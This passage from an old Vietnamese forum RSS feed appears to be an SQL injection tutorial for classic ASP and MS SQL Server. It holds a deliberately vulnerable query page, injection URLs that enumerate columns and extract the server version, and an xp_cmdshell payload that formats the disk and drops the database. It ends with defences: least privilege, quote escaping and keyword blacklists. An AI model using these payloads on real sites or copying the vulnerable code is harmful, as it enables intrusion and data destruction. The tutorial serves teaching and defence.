+
+Trong đó, ID = 2 là mã hàng hoá và câu lệnh để lấy thông tin về hàng hoá là
+
+CODE  
+Select prodName from products where id = 2 
+
+
+
+Và chúng ta hãy tạo 1 files có nhiệm vụ đưa ra thông tin hàng hoá là products.asp như sau
+
+CODE  
+<% 
+dim prodId 
+prodId = Request.QueryString("productId") 
+
+set conn = server.createObject("ADODB.Connection") 
+set rs = server.createObject("ADODB.Recordset") 
+
+query = "select prodName from products where id = " & prodId 
+
+conn.Open "Provider=SQLOLEDB; Data Source=(local); 
+Initial Catalog=myDB; User Id=sa; Password=" 
+rs.activeConnection = conn 
+rs.open query 
+
+if not rs.eof then 
+response.write "Got product " & rs.fields("prodName").value 
+else 
+response.write "No product found" 
+end if 
+%> 
+
+
+Sau đó chúng ta nhập vào dòng URL của Browser<span class="link"> http://www.mysite.com/products.asp?productId=0%20having%201=1</span>
+
+Ngay lập tức, trình duyệt sẽ báo lỗi như sau
+
+Microsoft OLE DB Provider for SQL Server (0x80040E14) 
+
+Column 'products.prodName' is invalid in the select 
+list because it is not contained in an aggregate 
+function and there is no GROUP BY clause. 
+
+/products.asp, line 13
+
+Cũng như ví dụ trên, 2 thông tin mà chúng ta khai thác được là Table products và Field prodName . Tiếp theo , với những thông tin đã biết được , ta tiếp tục đánh vào
+<span class="link"> http://www.mysite.com/products.asp?productId=0;insert%20into%20products</span> 
+(prodName)%20values(left(@@version,50))
+
+Câu URL trên đã chạy lệnh INSERT và thêm vào 1 row mới trong database, tại field prodName là 50 chữ cái thông tin về phiên bản Ms.SQL đang chạy tại server (Do biến @@version tạo ra). Vấn đề còn lại là lấy field đó ra trở lại
+<span class="link"> http://www.mysite.com/products.asp?productId=(select%20max(id</span>) 
+%20from%20products)
+
+Max(id) để bảo đảm lấy được hàng cuối cùng chứa thông tin mà chúng ta vừa thêm vào. Hãy xem bạn đã lấy được gì
+
+Got product Microsoft SQL Server 2000 - 8.00.534 (Intel X86)
+Đây là 1 thông tin vô cùng quí giá, nó cho phép Hackers tiếp theo lợi dụng những lổ hổng Security Bugs từ phiên bản này để tiếp tục tấn công và chiếm toàn quyền điều khiển server. 
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/382.hva#913</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/382.hva#913</link>
+				<pubDate><![CDATA[Sun, 25 Jun 2006 22:50:31]]> GMT</pubDate>
+				<author><![CDATA[ BigballVN]]></author>
+			</item>
+			<item>
+				<title>SQL Injection Tutorial - Sưu tầm của HVA cũ</title>
+				<description><![CDATA[ Phòng tránh SQL Injection như thế nào ?
+
+Hãy suy nghĩ như 1 hackers và thiết kế website của bạn với sự thận trọng tối đa. Như bạn đã thấy , những cách thức tấn công mà tôi ví dụ như trên không hề đòi hỏi 1 sự hiểu biết rộng về SQL mà đơn giản , hackers chỉ ứng dụng tốt những thứ cơ bản và lợi dụng vào ...sự chủ quan của bạn. Qui tắc số 1 trong thiết kế website có tương tác với người sử dụng là : ĐỪNG TIN NHỮNG GÌ USER ĐÁNH VÀO
+
+Một số biện pháp an toàn mà tôi biết được như sau:
+* Giới hạn quyền user:
+Đừng bao giờ sử dụng Default system account (sa) trong SQL server 2000 bởi vì account này có quá nhiều quyền hành. Bạn nên thiết kế 1 account để chỉ đáp ứng "đủ" những yêu cầu của website. Nếu bạn không sử dụng triggers, stored procedures, user-defined functions,... hãy Remove tất cả. Một trong những thứ hay bị Hackers lợi dụng là xp_cmdshell , xp_grantlogin. Vì vậy , hãy mạnh tay remove tất cả những gì bạn không sử dụng và không chắc sẽ sử dụng.
+
+* Loại bỏ dấu nháy (Quotes)
+Như bạn đã thấy , một số cách Injection là lợi dụng sự sơ hở của dấu ' , bằng cách tạo ra 1 hàm loại bỏ dấu ' như sau:
+
+
+CODE  
+<% 
+function stripQuotes(strWords) 
+stripQuotes = replace(strWords, "'", "''") 
+end function 
+%> 
+
+
+
+Thì câu Injection từ 
+
+CODE  
+select count(*) from users where userName='john' and 
+userPass='' or 1=1 --' 
+
+
+
+Trở thành
+
+CODE  
+select count(*) from users where userName='john'' and 
+userPass=''' or 1=1 --' 
+
+
+
+Và câu SQL trên trở nên vô nghĩa.
+
+* Cấm những từ "nhạy cảm":
+Thông qua 1 số ví dụ trên , chúng ta dễ dàng nhận ra những từ nhạy cảm của SQL là ;, --, select, insert và xp_ . Bằng cách tạo ra 1 hàm để loại bỏ những từ trên:
+
+
+CODE  
+<% 
+function killChars(strWords) 
+dim badChars 
+dim newChars 
+badChars = array("select", "drop", ";", "--", "insert", 
+"delete", "xp_") 
+newChars = strWords 
+for i = 0 to uBound(badChars) 
+newChars = replace(newChars, badChars(i), "") 
+next 
+killChars = newChars 
+end function 
+%> 
+
+
+
+Sử dụng kết hợp giữa stripQuotes và killChars để loại bỏ những từ "nhạy cảm" 1 cách triệt để , hãy xem nếu câu SQL Injection có dạng :
+
+
+CODE  
+select prodName from products where id=1; xp_cmdshell 'format 
+c: /q /yes '; drop database myDB; -- 
+
+
+
+Sẽ trở thành:
+
+
+CODE  
+prodName from products where id=1 cmdshell ''format c: 
+/q /yes '' database myDB 
+
+
+Và hoàn toàn vô nghĩa.
+
+* Giới hạn những gì họ nói:
+Bằng cách giới hạn những Textbox và input càng ngắn càng tốt , bạn sẽ giảm thiểu nguy cơ tối đa bị tấn công bằng Injection. Ngoài ra phải kiểm tra những input có dạng số (VD như Product=1) bằng hàm IsNumeric()..
+
+Kết luận:
+
+Những ví dụ trên này chỉ giúp bạn hình dung về SQL Injection và suy nghĩ như Hackers. Thật không thể nào bảo đảm được rằng có 1 cách nào đó có thể chống lại lỗi này và tự bạn phải liên tưởng ra các tình huống cụ thể để bảo vệ server của bạn.
+
+Mặc dù trên đây chúng ta chỉ đưa ra ví dụ với Mircosoft SQL Server , nhưng lỗi SQL Injection xuất hiện trong tất cả các phiên bản của SQL như MySQL , Oracle... và không thể sửa chữa bởi nhà cung cấp vì đó là lỗi sơ xuất của người lập trình web.
+
+Những kiến thức, ví dụ trên đây chỉ nhằm mục đích học tập, bạn không được sử dụng chúng để phá hoại. Chúng tôi không chịu trách nhiệm về bất cứ hành vi nào do người đọc bài viết này gây ra. 
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/382.hva#914</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/382.hva#914</link>
+				<pubDate><![CDATA[Sun, 25 Jun 2006 22:50:47]]> GMT</pubDate>
+				<author><![CDATA[ BigballVN]]></author>
+			</item>
+	</channel>
+</rss>
